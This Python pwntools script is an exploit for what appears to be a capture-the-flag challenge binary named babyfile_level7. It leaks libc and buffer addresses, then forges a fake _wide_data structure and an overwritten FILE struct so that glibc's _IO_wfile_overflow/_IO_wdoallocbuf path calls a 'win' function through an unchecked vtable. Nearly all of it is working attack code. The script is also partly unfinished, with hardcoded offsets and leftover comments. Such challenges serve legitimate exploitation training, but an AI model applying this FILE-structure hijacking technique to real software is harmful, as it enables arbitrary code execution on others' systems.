#!/usr/bin/env python3
from pwn import *

# Process setup
p = process('./babyfile_level7')
s = '''
b * fwrite
b * fwrite+184
b * __GI__IO_wdoallocbuf
b * _IO_wfile_overflow+41
'''
# Extract addresses
p.recvuntil(b'puts() within libc is: ')
puts_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'name buffer is located at: ')
buf_addr = int(p.recvline().strip(), 16)

log.info(f"puts: {hex(puts_addr)}")
log.info(f"buf: {hex(buf_addr)}")


_IO_wfile_underflow_maybe_mmap_plus_8 = puts_addr + 0x4b48 # _IO_wfile_underflow_maybe_mmap+8 + 0x38 is _IO_wfile_overflow

# _IO_wfile_overflow would call do_allocbuf, which would call _wide_data vtable with no check


'''
__GI__IO_wdoallocbuf:

mov    rax,QWORD PTR [rdi+0xa0] # moving _wide_data into rax
...
mov    rax,QWORD PTR [rax+0xe0] # moving rax+0xe0 (vtable of _wide_data) back into rax
call   QWORD PTR [rax+0x68] # calls the pointer there + 0x68


'''
# Send name
p.recvuntil(b'Please enter your name.\n')
# Create fake _wide_data structure with vtable pointing to win
win = 0x004012e6
fake_wide_data = b'\x00' * 0x68
fake_wide_data += p64(win)
fake_wide_data += b'\x00' * (0xe0 - 0x70)
fake_wide_data += p64(buf_addr)
fake_wide_data = fake_wide_data.ljust(0x100, b'\x00')
p.send(fake_wide_data)

# Modify FILE struct
p.recvuntil(b'Now reading from stdin directly to the FILE struct.\n')
# Get the original __pad5 value from the program output
# From your output: 0x2ef60468 = 140322187670720
original_pad5 = puts_addr + 0x168d60  # Or extract this dynamically

# In your FILE struct payload, preserve this value:
file_payload = b'\x00' * 0x88
file_payload += p64(buf_addr + 0x1f0)  # Some other field
file_payload += p64(0xffffffffffffffff)  # _offset (-1)
file_payload += b'\x00' * 0x8  # _codecvt
file_payload += p64(buf_addr)  # _wide_data
file_payload += b'\x00' * (0xe0 - 0xa8 - 8)  # Rest of struct
file_payload += p64(puts_addr + 0x166aa0 - 0x38)
#file_payload = 'A'

gdb.attach(p, s)
p.send(file_payload)

p.interactive()
